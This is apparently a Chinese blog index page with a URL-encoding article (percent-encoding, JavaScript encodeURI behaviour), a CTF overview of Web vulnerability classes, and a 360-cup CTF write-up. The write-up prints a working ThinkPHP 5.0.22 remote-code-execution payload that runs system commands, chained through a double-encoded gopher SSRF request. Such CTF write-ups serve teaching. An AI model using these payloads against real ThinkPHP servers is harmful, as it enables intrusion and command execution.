<p>　　但是由于历史原因，目前尚存在一些不标准的编码实现。例如虽然RFC3986文档规定，对于波浪符号~，不需要进行URL编码，但是还是有很多老的网关或者传输代理会进行编码。</p>
<h1 id="4-如何对URL中的非法字符进行编码"><a href="#4-如何对URL中的非法字符进行编码" class="headerlink" title="4 如何对URL中的非法字符进行编码"></a>4 如何对URL中的非法字符进行编码</h1><p>URL编码通常也被称为百分号编码（URL Encoding，also known as percent-encoding），是因为它的编码方式非常简单，使用%百分号加上两位的字符——0123456789ABCDEF——代表一个字节的十六进制形式。URL编码默认使用的字符集是US-ASCII。例如a在US-ASCII码中对应的字节是0x61，那么Url编码之后得到的就是%61，我们在地址栏上输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://g.cn/search?q=%61%62%63</span><br></pre></td></tr></table></figure>

<p>实际上就等同于在google上搜索abc了。又如@符号在ASCII字符集中对应的字节为0x40，经过URL编码之后得到的是%40。</p>
<p>　　对于非ASCII字符，需要使用ASCII字符集的超集进行编码得到相应的字节，然后对每个字节执行百分号编码。对于Unicode字符，RFC文档建议使用utf-8对其进行编码得到相应的字节，然后对每个字节执行百分号编码。如”中文”使用UTF-8字符集得到的字节为0xE4 0xB8 0xAD 0xE6 0x96 0x87，经过Url编码之后得到”%E4%B8%AD%E6%96%87”。</p>
<p>　　如果某个字节对应着ASCII字符集中的某个非保留字符，则此字节无需使用百分号表示。例如”Url编码”，使用UTF-8编码得到的字节是0x55 0x72 0x6C 0xE7 0xBC 0x96 0xE7 0xA0 0x81，由于前三个字节对应着ASCII中的非保留字符”Url”，因此这三个字节可以用非保留字符”Url”表示。最终的Url编码可以简化成”Url%E7%BC%96%E7%A0%81” ，当然，如果你用”%55%72%6C%E7%BC%96%E7%A0%81”也是可以的。</p>
<p>　　由于历史的原因，有一些URL编码实现并不完全遵循这样的原则，下面会提到。</p>
<h1 id="5-Javascript中的escape-encodeURI和encodeURIComponent的区别"><a href="#5-Javascript中的escape-encodeURI和encodeURIComponent的区别" class="headerlink" title="5 Javascript中的escape, encodeURI和encodeURIComponent的区别"></a>5 Javascript中的escape, encodeURI和encodeURIComponent的区别</h1><p>JavaScript中提供了3对函数用来对URL编码以得到合法的URL，它们分别是escape &#x2F; unescape, encodeURI &#x2F; decodeURI和encodeURIComponent &#x2F; decodeURIComponent。由于解码和编码的过程是可逆的，因此这里只解释编码的过程。</p>
<p>　　这三个编码的函数——escape，encodeURI，encodeURIComponent——都是用于将不安全不合法的Url字符转换为合法的Url字符表示，它们有以下几个不同点。</p>
<p>　　安全字符不同：</p>
<p>　　下面列出了这三个函数的安全字符（即函数不会对这些字符进行编码）</p>
<ul>
<li>escape（69个）：*&#x2F;@+-._0-9a-zA-Z</li>
<li>encodeURI（82个）：!#$&amp;’()*+,&#x2F;:;&#x3D;?@-._~0-9a-zA-Z</li>
<li>encodeURIComponent（71个）：!’()*-._~0-9a-zA-Z</li>
</ul>
<p>兼容性不同：escape函数是从Javascript1.0的时候就存在了，其他两个函数是在Javascript1.5才引入的。但是由于Javascript1.5已经非常普及了，所以实际上使用encodeURI和encodeURIComponent并不会有什么兼容性问题。</p>
<p>　　对Unicode字符的编码方式不同：这三个函数对于ASCII字符的编码方式相同，均是使用百分号+两位十六进制字符来表示。但是对于Unicode字符，escape的编码方式是%uxxxx，其中的xxxx是用来表示unicode字符的4位十六进制字符。这种方式已经被W3C废弃了。但是在ECMA-262标准中仍然保留着escape的这种编码语法。encodeURI和encodeURIComponent则使用UTF-8对非ASCII字符进行编码，然后再进行百分号编码。这是RFC推荐的。因此建议尽可能的使用这两个函数替代escape进行编码。</p>
<p>　　适用场合不同：encodeURI被用作对一个完整的URI进行编码，而encodeURIComponent被用作对URI的一个组件进行编码。从上面提到的安全字符范围表格来看，我们会发现，encodeURIComponent编码的字符范围要比encodeURI的大。我们上面提到过，保留字符一般是用来分隔URI组件（一个URI可以被切割成多个组件，参考预备知识一节）或者子组件（如URI中查询参数的分隔符），如：号用于分隔scheme和主机，?号用于分隔主机和路径。由于encodeURI操纵的对象是一个完整的的U<br>RI，这些字符在URI中本来就有特殊用途，因此这些保留字符不会被encodeURI编码，否则意义就变了。</p>
<p>　　组件内部有自己的数据表示格式，但是这些数据内部不能包含有分隔组件的保留字符，否则就会导致整个URI中组件的分隔混乱。因此对于单个组件使用encodeURIComponent，需要编码的字符就更多了。</p>
<h1 id="6-表单提交"><a href="#6-表单提交" class="headerlink" title="6 表单提交"></a>6 表单提交</h1><p>　当Html的表单被提交时，每个表单域都会被URL编码之后才在被发送。由于历史的原因，表单使用的URL编码实现并不符合最新的标准。例如对于空格使用的编码并不是%20，而是+号，如果表单使用的是Post方法提交的，我们可以在HTTP头中看到有一个Content-Type的header，值为application&#x2F;x-www-form-urlencoded。大部分应用程序均能处理这种非标准实现的URL编码，但是在客户端Javascript中，并没有一个函数能够将+号解码成空格，只能自己写转换函数。还有，对于非ASCII字符，使用的编码字符集取决于当前文档使用的字符集。例如我们在Html头部加上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot; /&gt;</span><br></pre></td></tr></table></figure>

<p>这样浏览器就会使用gb2312去渲染此文档（注意，当HTML文档中没有设置此meta标签，则浏览器会根据当前用户喜好去自动选择字符集，用户也可以强制当前网站使用某个指定的字符集）。当提交表单时，URL编码使用的字符集就是gb2312。</p>
<p>　　之前在使用Aptana（为什么专指aptana下面会提到）遇到一个很迷惑的问题，就是在使用encodeURI的时候，发现它编码得到的结果和我想的很不一样。下面是我的示例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; </span><br><span class="line">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=gb2312&quot; /&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">            document.write(encodeURI(&quot;中文&quot;));</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>运行结果输出%E6%B6%93%EE%85%9F%E6%9E%83。显然这并不是使用UTF-8字符集进行URL编码得到的结果（在Google上搜索”中文”，URL中显示的是%E4%B8%AD%E6%96%87）。</p>
<p>所以我当时就很质疑，难道encodeURI还跟页面编码有关，但是我发现，正常情况下，如果你使用gb2312进行URL编码也不会得到这个结果的才是。后来终于被我发现，原来是页面文件存储使用的字符集和Meta标签中指定的字符集不一致导致的问题。Aptana的编辑器默认情况下使用UTF-8字符集。也就是说这个文件实际存储的时候使用的是UTF-8字符集。但是由于Meta标签中指定了gb2312，这个时候，浏览器就会按照gb2312去解析这个文档，那么自然在”中文”这个字符串这里就会出错，因为”中文”字符串用UTF-8编码过后得到的字节是0xE4 0xB8 0xAD 0xE6 0x96 0x87，这6个字节又被浏览器拿gb2312去解码，那么就会得到另外三个汉字”涓枃”（GBK中一个汉字占两个字节），这三个汉字在传入encodeURI函数之后得到的结果就是%E6%B6%93%EE%85%9F%E6%9E%83。因此，encodeURI使用的还是UTF-8，并不会受到页面字符集的影响。</p>
<p>　　对于包含中文的URL的处理问题，不同浏览器有不同的表现。例如对于IE，如果你勾选了高级设置”总是以UTF-8发送URL”，那么URL中的路径部分的中文会使用UTF-8进行URL编码之后发送给服务端，而查询参数中的中文部分使用系统默认字符集进行URL编码。为了保证最大互操作性，建议所有放到URL中的组件全部显式指定某个字符集进行URL编码，而不依赖于浏览器的默认实现。</p>
<p>　　另外，很多HTTP监视工具或者浏览器地址栏等在显示URL的时候会自动将URL进行一次解码（使用UTF-8字符集），这就是为什么当你在Firefox中访问Google搜索中文的时候，地址栏显示的URL包含中文的缘故。但实际上发送给服务端的原始URL还是经过编码的。你可以在地址栏上使用Javascript访问location.href就可以看出来了。在研究URL编解码的时候千万别被这些假象给迷惑了。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/09/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8CURL%E7%BC%96%E7%A0%81%EF%BC%88%E8%BD%AC%EF%BC%89/" data-id="cl1qb1dyu0056qktufetuflmt" data-title="为什么要进行URL编码（转）" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-360杯-Web实战-smity_ssrf中的gopher协议" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/09/360%E6%9D%AF-Web%E5%AE%9E%E6%88%98-smity_ssrf%E4%B8%AD%E7%9A%84gopher%E5%8D%8F%E8%AE%AE/" class="article-date">
  <time class="dt-published" datetime="2019-11-09T03:59:43.000Z" itemprop="datePublished">2019-11-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/09/360%E6%9D%AF-Web%E5%AE%9E%E6%88%98-smity_ssrf%E4%B8%AD%E7%9A%84gopher%E5%8D%8F%E8%AE%AE/">360杯-Web实战-smity_ssrf中的gopher协议</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="1-目录"><a href="#1-目录" class="headerlink" title="1 目录"></a>1 目录</h1><ol>
<li>SSRF漏洞的产生</li>
<li>gopher协议</li>
<li>tp框架漏洞</li>
<li>二次编码</li>
</ol>
<h1 id="2-SSRF漏洞的产生"><a href="#2-SSRF漏洞的产生" class="headerlink" title="2 SSRF漏洞的产生"></a>2 SSRF漏洞的产生</h1><p>SSRF（Server-Side Request Forgery：服务器端请求伪造）是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF是能够直接对目标网站的内部系统发起请求。（因为它是从内部网络系统访问的，所以可以通过她攻击外网无法访问的内部系统，也就是把目标网站当中间人）</p>
<p><img src="https://img-blog.csdnimg.cn/20191109121012569.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="SSRF（服务端请求伪造原理）"></p>
<h1 id="3-gopher协议"><a href="#3-gopher协议" class="headerlink" title="3 gopher协议"></a>3 gopher协议</h1><p>Gopher是Internet上一个很有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便用户获取。Gopher协议使得Internet上的所有Gopher客户程序能够与已注册的Gopher服务器对话。简单来说，在WWW出现之前，Gopher是Internet上最主要的信息检索工具。在这里我将其当作一个等价于访问网页的正常请求方式。在SSRF中，经常会使用Gopher来构造GET&#x2F;POST包攻击应用，它的使用格式如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://URL</span><br></pre></td></tr></table></figure>

<h1 id="4-tp框架漏洞"><a href="#4-tp框架漏洞" class="headerlink" title="4 tp框架漏洞"></a>4 tp框架漏洞</h1><p>这个漏洞是5.0.22版本的一个很著名的漏洞，对于一般的系统来说，没有补上的话，就会别攻击者构造get包进行rce，有关这个漏洞的详细介绍可以看下面的这篇文章</p>
<p><a target="_blank" rel="noopener" href="http://www.secflag.com/archives/505.html">http://www.secflag.com/archives/505.html</a></p>
<p>构造的payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>

<h1 id="5-二次编码"><a href="#5-二次编码" class="headerlink" title="5 二次编码"></a>5 二次编码</h1><p>详见下面我的这篇文章</p>
<p><a target="_blank" rel="noopener" href="https://xingshuaikun.github.io/2019/11/09/%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%9B%E8%A1%8CURL%E7%BC%96%E7%A0%81%EF%BC%88%E8%BD%AC%EF%BC%89/">为什么要进行URL编码</a></p>
<h1 id="6-一道具体的tp框架题目"><a href="#6-一道具体的tp框架题目" class="headerlink" title="6 一道具体的tp框架题目"></a>6 一道具体的tp框架题目</h1><p>题目链接如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://180.153.183.49:7200/</span><br></pre></td></tr></table></figure>

<p>1 进去后发现是一个tp框架</p>
<p><img src="https://img-blog.csdnimg.cn/20191109175328421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="tp框架"></p>
<p>2 一般情况下的tp框架的目录页放在public下，应用和文件放在application下</p>
<p><img src="https://img-blog.csdnimg.cn/20191109175406989.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="基本结构"></p>
<p><img src="https://img-blog.csdnimg.cn/20191109175612838.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="application功能页面"></p>
<p><img src="https://img-blog.csdnimg.cn/20191109175656139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="public目录页"></p>
<p>3 进去public页面后，我们发现出题人太过自信了吧，通过观察提示发现题目踪迹</p>
<p><img src="https://img-blog.csdnimg.cn/20191109175913262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="提示1"></p>
<p><img src="https://img-blog.csdnimg.cn/20191109180351246.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="robots.txt"></p>
<p>4 发觉应该还有文件没找到，通过尝试发现了ssrf.php文件</p>
<p><img src="https://img-blog.csdnimg.cn/2019110918025550.png" alt="ssrf.php"></p>
<p>5 许多协议（ftp、ftps、http、https、file、dict等）都被过滤，通过尝试发现gopher协议未被过滤</p>
<p><img src="https://img-blog.csdnimg.cn/20191109180557844.png" alt="http被过滤"></p>
<p><img src="https://img-blog.csdnimg.cn/2019110918091573.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="gopher未被过滤"></p>
<p>6 URL需要进行二次编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip?url=gopher://URL</span><br></pre></td></tr></table></figure>

<p>上面的地址中<a target="_blank" rel="noopener" href="http://ip/?%E6%98%AF%E6%9C%AC%E5%9C%B0%E5%90%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E8%BF%9B%E8%A1%8C%E7%9A%84%E8%AF%B7%E6%B1%82%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%B8%80%E6%AC%A1%E7%BC%96%E7%A0%81%EF%BC%89%EF%BC%8C%E8%80%8Curl=gopher://URL%E4%BC%9A%E5%9C%A8%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82URL%E4%B8%AD%E7%9A%84%E5%80%BC%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9B%E8%A1%8C%E4%BA%8C%E6%AC%A1%E7%BC%96%E7%A0%81%EF%BC%89">http://ip?是本地向服务器端进行的请求（需要进行一次编码），而url=gopher://URL会在服务端请求URL中的值（需要进行二次编码）</a></p>
<p>一次编码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://180.153.183.49:7200/1/public/ssrf.php?url=gopher://127.0.0.1:80/_GET </span><br></pre></td></tr></table></figure>

<p>二次编码（注意gopher协议中空格编码成+，即%2B，而在其他情况下空格常编码成%20）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat /flag</span><br></pre></td></tr></table></figure>

<p>通过在线网站<a target="_blank" rel="noopener" href="https://www.sojson.com/encodeurl.html">https://www.sojson.com/encodeurl.html</a>进行一二次编码即可得到payload</p>
<p><img src="https://img-blog.csdnimg.cn/20191109185719690.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="一次编码"></p>
<p><img src="https://img-blog.csdnimg.cn/20191109190245256.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="二次编码"></p>
<p><img src="https://img-blog.csdnimg.cn/20191109190335862.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="二次编码的第一次编码"></p>
<p>然后把第一次的结果进行第二次编码</p>
<p><img src="https://img-blog.csdnimg.cn/2019110919042347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="二次编码的第二次编码"></p>
<p>再将空格对应的%20改成+对应的编码后的格式%2B，即可得到payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://180.153.183.49:7200/1/public/ssrf.php?url=gopher://127.0.0.1:80/_GET%20%252F1%252Fpublic%252Findex.php%253Fs%253Dindex%252F%255Cthink%255Capp%252Finvokefunction%2526function%253Dcall_user_func_array%2526vars%255B0%255D%253Dsystem%2526vars%255B1%255D%255B%255D%253Dcat%2B%252Fflag</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20191109190500120.png" alt="得到flag"></p>
<h1 id="7-post包举例"><a href="#7-post包举例" class="headerlink" title="7 post包举例"></a>7 post包举例</h1><p>注意查看一二次解密过程中需要二次解密的部分</p>
<p><img src="https://img-blog.csdnimg.cn/20191109190956433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="POST包一次解密"></p>
<p><img src="https://img-blog.csdnimg.cn/20191109191100374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA5MjAw,size_16,color_FFFFFF,t_70" alt="POST包二次解密"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/09/360%E6%9D%AF-Web%E5%AE%9E%E6%88%98-smity_ssrf%E4%B8%AD%E7%9A%84gopher%E5%8D%8F%E8%AE%AE/" data-id="cl1qb1dwt0007qktu0rkbdp67" data-title="360杯-Web实战-smity_ssrf中的gopher协议" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-360杯-Web实战-Web" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/11/09/360%E6%9D%AF-Web%E5%AE%9E%E6%88%98-Web/" class="article-date">
  <time class="dt-published" datetime="2019-11-09T02:23:43.000Z" itemprop="datePublished">2019-11-09</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/Web/">Web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2019/11/09/360%E6%9D%AF-Web%E5%AE%9E%E6%88%98-Web/">360杯-Web实战</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="1-目录"><a href="#1-目录" class="headerlink" title="1 目录"></a>1 目录</h1><ol>
<li>Web系统的组成部分</li>
<li>如何判断是哪一块出了问题</li>
<li>CTF-Web题目解题思路之–语言</li>
<li>CTF-Web题目解题思路之–数据库</li>
<li>CTF-Web题目解题思路之–Web服务器软件</li>
<li>CTF-Web题目解题思路之–操作系统</li>
</ol>
<h1 id="2-Web系统的组成部分"><a href="#2-Web系统的组成部分" class="headerlink" title="2 Web系统的组成部分"></a>2 Web系统的组成部分</h1><h2 id="2-1-LAMP系统"><a href="#2-1-LAMP系统" class="headerlink" title="2.1 LAMP系统"></a>2.1 LAMP系统</h2><p>LAMP含义：一个Web系统的组成部分就只有四个方面：操作系统、Web服务软件（Apache、Nginx）、数据库、Web语言</p>
<p>Web题目不仅仅是一个题目，更是一个Web系统，解题的目的就是为了能够渗透这个Web系统，获取信息或者权限</p>
<h1 id="3-如何判断是哪一块出了问题"><a href="#3-如何判断是哪一块出了问题" class="headerlink" title="3 如何判断是哪一块出了问题"></a>3 如何判断是哪一块出了问题</h1><p>Web系统的主要目的是为了生活服务，具有特定的功能，所以一般可以分为以下几个步骤去检测这个Web系统到底出了什么问题</p>
<ol>
<li>探明清楚Web系统的语言、框架，首先能满足其正常功能；</li>
<li>查看有没有数据库功能，存在数据库一般都会有数据库的考点；</li>
<li>接着扫描目录，查看有没有源码或者其他提示性文件；</li>
<li>寻找输入点（包括输入框、文件上传点、XSS点等），根据语言特性，进行payload测试，挖掘语言上的漏洞；</li>
<li>最后再考虑是否是操作系统或者Web服务器上的漏洞，这块基本都会涉及到webpwn方面的知识。</li>
</ol>
<h1 id="4-CTF-Web题目解题思路之–语言"><a href="#4-CTF-Web题目解题思路之–语言" class="headerlink" title="4 CTF-Web题目解题思路之–语言"></a>4 CTF-Web题目解题思路之–语言</h1><h2 id="4-1-前端语言"><a href="#4-1-前端语言" class="headerlink" title="4.1 前端语言"></a>4.1 前端语言</h2><ol>
<li>HTML和CSS一般不会单独作为考点，但是依然要掌握快速读懂它们的技巧</li>
<li>JavaScript考点：目前前端考点都集中在这块<br>信息获取：JS加解密、XSS攻击、CSP防御机制绕过、CSRF等；<br>权限获取：NodeJS代码审计、前端VUE、跨域。</li>
<li>关于每个方向的解题方法<br>JS加解密解题主要靠积累，利用常用在线加解密网站即可；<br>XSS攻击主要思路为寻找题目中BOT访问外界的点，然后查看有无CSP防御，并且根据题意构造合适的payload。</li>
</ol>
<p>关于每个方向的主要解题方法</p>
<ol>
<li>NodeJS审计需要一定的代码审计功底，题目纷繁复杂，出题点也各异，但是目前主要的形式都是做成游戏然后给出源码对其进行审计</li>
<li>解题思路：源码审计，寻找可利用的eval()函数，构造语句使得eval()函数可控，远程安装npm包实现命令执行。</li>
</ol>
<h2 id="4-2-后端语言"><a href="#4-2-后端语言" class="headerlink" title="4.2 后端语言"></a>4.2 后端语言</h2><ol>
<li>Python</li>
<li>Java</li>
<li>PHP</li>
</ol>
<h3 id="4-2-1-Python主要考点"><a href="#4-2-1-Python主要考点" class="headerlink" title="4.2.1 Python主要考点"></a>4.2.1 Python主要考点</h3><ol>
<li>ssti服务端模板注入</li>
<li>yml反序列化，PyYAML在解析数据的时候遇到特定格式的时间数据会将其自动转化为Python时间对象（类似于PHP反序列化）</li>
<li>JWT认证绕过（伪造token，伪造session）</li>
<li>secret key泄露导致命令执行（一般是Django代码执行）</li>
<li>Django、flask、tornado等框架的漏洞</li>
</ol>
<h3 id="4-2-2-Java主要考点"><a href="#4-2-2-Java主要考点" class="headerlink" title="4.2.2 Java主要考点"></a>4.2.2 Java主要考点</h3><ol>
<li>spring框架漏洞，近年较火</li>
<li>Java反序列化</li>
<li>代码审计</li>
</ol>
<h3 id="4-2-3-PHP主要考点"><a href="#4-2-3-PHP主要考点" class="headerlink" title="4.2.3 PHP主要考点"></a>4.2.3 PHP主要考点</h3><ol>
<li>Bypass：最常用考点，主要源于PHP语言本身书写时的一个漏洞，典型案例PHP黑魔法</li>
<li>条件竞争：多个客户端同时访问一个服务器的功能所带来的非预期结果</li>
<li>反序列化：只要题目给了源码大概率是反序列化漏洞，解题思路为寻找起点和终点（魔法函数起点（unserialize等）-&gt;新的php对象-&gt;pop链-&gt;目的函数终点（eval）</li>
<li>文件包含：大部分考点在于本地文件包含（LFI），在实战中可拿到shell</li>
<li>SSRF：服务端请求伪造，可以结合很多协议其他协议进行利用，达到攻击内网的目的</li>
<li>phar利用：经常和LFI结合，同时也经常结合反序列化等考点</li>
<li>文件上传绕过</li>
<li>框架考点：了解著名的框架，例如thinkphp、laravel、各种cms</li>
</ol>
<h1 id="5-CTF-Web题目解题思路之–数据库"><a href="#5-CTF-Web题目解题思路之–数据库" class="headerlink" title="5 CTF-Web题目解题思路之–数据库"></a>5 CTF-Web题目解题思路之–数据库</h1><ol>
<li>sql注入</li>
<li>权限获取</li>
</ol>
<h1 id="6-CTF-Web题目解题思路之–Web服务器软件"><a href="#6-CTF-Web题目解题思路之–Web服务器软件" class="headerlink" title="6 CTF-Web题目解题思路之–Web服务器软件"></a>6 CTF-Web题目解题思路之–Web服务器软件</h1><h2 id="6-1-Web服务器题目种类"><a href="#6-1-Web服务器题目种类" class="headerlink" title="6.1 Web服务器题目种类"></a>6.1 Web服务器题目种类</h2><ol>
<li>Linux上的服务器：Apache、Nginx服务器<br>考点：服务器解析漏洞（常与文件上传结合），LD_PRELOAD（可使得在执行php程序时优先引用自己写到的动态链接库），Nginx配置漏洞（目录泄露），Apache栈溢出漏洞（涉及webpwn）等</li>
<li>Windows上的服务器：IIS<br>考点：PUT发包上传漏洞，IIS远程溢出漏洞等</li>
<li>服务器组件漏洞<br>考点：Apache组件提权漏洞，CGI漏洞（公共网关接口，配合Nginx解析漏洞）</li>
</ol>
<h1 id="7-CTF-Web题目解题思路之–操作系统"><a href="#7-CTF-Web题目解题思路之–操作系统" class="headerlink" title="7 CTF-Web题目解题思路之–操作系统"></a>7 CTF-Web题目解题思路之–操作系统</h1><h2 id="7-1-操作系统中考点不多，一般结合webpwn"><a href="#7-1-操作系统中考点不多，一般结合webpwn" class="headerlink" title="7.1 操作系统中考点不多，一般结合webpwn"></a>7.1 操作系统中考点不多，一般结合webpwn</h2><ol>
<li>操作系统中的目录遍历</li>
<li>.so文件逆向分析</li>
<li>结合tensorflow进行机器学习考察</li>
<li>区块链考点</li>
<li>结合密码学：CBC翻转攻击，哈希扩展攻击，padding oracel填充攻击</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/11/09/360%E6%9D%AF-Web%E5%AE%9E%E6%88%98-Web/" data-id="cl1qb1dwq0005qktugoncbg7t" data-title="360杯-Web实战" class="article-share-link">分享</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>

    </footer>
  </div>
  
</article>



  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/page/3/">&laquo; 上一页</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="page-number" href="/page/6/">6</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/5/">下一页 &raquo;</a>
